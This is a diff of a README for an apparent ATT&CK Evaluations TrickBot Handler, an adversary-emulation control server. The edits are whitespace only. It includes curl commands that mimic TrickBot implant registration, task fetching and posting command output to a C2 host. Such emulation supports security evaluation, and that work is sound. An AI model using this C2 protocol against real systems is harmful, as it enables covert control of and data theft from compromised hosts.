@@ -1,6 +1,6 @@
 # ATT&CK Evaluations TrickBot Handler
 
-The ATT&CK Evaluations TrickBot Handler is used to handle communications between the Trickbot Client and control server via a REST API. 
+The ATT&CK Evaluations TrickBot Handler is used to handle communications between the Trickbot Client and control server via a REST API.
 
 The TrickBot Handler provides features to communicate with the Trickbot Client and forwarding control information to the Control Server.
 
@@ -36,25 +36,31 @@ sudo go test ./...
 ```
 
 ### Go Build
+
 ```
 cd wizard_spider/Resources/control_server/
 go build main.go
 ```
+
 ### Registration Example
 
 On server:
+
 ```
 cd wizard_spider/Resources/control_server/
 sudo ./main
 ```
 
 On client or another server shell:
+
 ```
  curl {hostip}:447/camp1/DMIN_W617601.HATGSF1265TRQIKSH54367FSGDHUIA11/0/Windows7x64/1234/0.0.0.0/GAVHSGFD12345ATGSHBDSAFSGTAGSBHSGFSDATQ12345AGSFSGBDISHJKAGS2343/C:/1111/2222/HAGSTGST123
 ```
 
 ### Get Task Example
+
 On client or another server shell:
+
 ```
 curl {hostip}:447/camp1/DMIN_W617601.HATGSF1265TRQIKSH54367FSGDHUIA11/80/HAGSTGST123
 ```
@@ -62,6 +68,7 @@ curl {hostip}:447/camp1/DMIN_W617601.HATGSF1265TRQIKSH54367FSGDHUIA11/80/HAGSTGS
 ### Post Task Output Example
 
 On client or another server shell:
+
 ```
-curl {hostip}:447/camp1/DMIN_W617601.HATGSF1265TRQIKSH54367FSGDHUIA11/10/cmd/messageouput/HAGSTGST123 
+curl {hostip}:447/camp1/DMIN_W617601.HATGSF1265TRQIKSH54367FSGDHUIA11/10/cmd/messageouput/HAGSTGST123
 ```
